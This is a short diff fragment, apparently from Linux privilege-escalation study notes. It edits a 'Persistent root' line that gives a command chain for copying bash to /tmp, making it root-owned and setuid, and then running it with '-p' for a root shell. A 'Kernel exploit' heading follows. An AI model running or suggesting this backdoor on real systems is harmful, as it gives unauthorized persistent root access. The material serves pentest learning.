@@ -1,4 +1,4 @@
-Persistent root: `cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash`
+Persistent root: `cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash` -> /tmp/rootbash -p`
 
 1. Kernel exploit:
     + Detection:
